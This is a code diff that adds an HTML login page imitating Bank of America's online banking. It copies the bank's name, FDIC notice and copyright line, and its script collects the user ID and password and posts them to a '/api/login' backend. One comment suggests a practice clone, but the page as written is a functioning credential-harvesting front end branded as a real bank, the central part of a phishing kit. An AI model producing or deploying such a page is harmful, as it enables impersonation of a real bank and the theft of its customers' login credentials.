@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Bank Of America Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        header {
+            width: 70%;
+            margin: 5px;
+            background-color: #ccc;
+            color: #555;
+            padding: 5px 0;
+            text-align: center;
+            font-size: 12px;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .login-container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            margin-top: 30px;
+        }
+
+        h1 {
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: #ffffff;
+            background-color: #d4001a;
+            padding: 10px;
+        }
+
+        label {
+            display: block;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            margin-top: 15px;
+            width: 100%;
+            padding: 10px;
+            background: #137fec;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #0021b2;
+        }
+
+        .help-links {
+            margin-top: 15px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .help-links a {
+            color: #137fec;
+            text-decoration: none;
+        }
+
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+
+        .promo {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .app-btn {
+            background: #d4001a;
+            color: #fff;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .extra-links {
+            margin-top: 25px;
+            text-align: center;
+        }
+
+        .extra-links h2 {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .extra-links a {
+            margin: 0 8px;
+            color: #137fec;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .extra-links a:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 13px;
+            text-align: center;
+            color: #555;
+            width: 100%;
+            background-color: #ccc;
+            padding: 10px 0;
+            position: fixed;
+            bottom: 0;
+        }
+
+        footer a {
+            color: #0066cc;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header>
+        Bank Of America deposit products: FDIC FDIC-Insured-Backed by
+        full faith and credit of the U.S. Government
+    </header>
+
+    <div class="login-container">
+        <img src="boam2.png" alt="">
+        <h1> Log In to Online Banking </h1>
+        <form action="" method="POST" id="loginForm" title="">
+            <label for="userID">User ID</label>
+            <input type="text" id="userID" name="userID" required>
+            <input type="checkbox" id="saveID" name="saveID"> Save this User ID
+
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+
+            <button type="submit">Log In</button>
+        </form>
+
+        <div class="help-links">
+            <a href="#">Forgot ID/Password?</a> |
+            <a href="#">Problem logging in?</a>
+        </div>
+
+        <div class="promo">
+            <h2>Stay connected with our app</h2>
+            <p>Secure, convenient banking anytime</p>
+            <button class="app-btn">Get the app</button>
+        </div>
+
+    </div>
+
+    <footer>
+        <p>
+            <a href="#">Privacy</a> |
+            <a href="#">Security</a> |
+            <a href="#">Your Privacy Choices</a>
+        </p>
+        <p>© 2025 Bank Of America, NA. Member FDIC. Equal Housing Lender.</p>
+    </footer>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const userID = document.getElementById("userID").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const saveID = document.getElementById("saveID").checked;
+
+            if (userID === "" || password === "") {
+                alert("Please fill in both fields.");
+                return;
+            }
+
+            // Send data to backend (Relative path for deployment)
+            fetch('/api/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ userID, password, saveID })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        alert("Login successful! Redirecting...");
+                        // In a real app, redirection would happen here
+                        // window.location.href = "/dashboard";
+                    } else {
+                        alert("Login failed. Please try again.");
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert("An error occurred. Please try again later.");
+                });
+        });
+    </script>
+</body>
+
+</html>
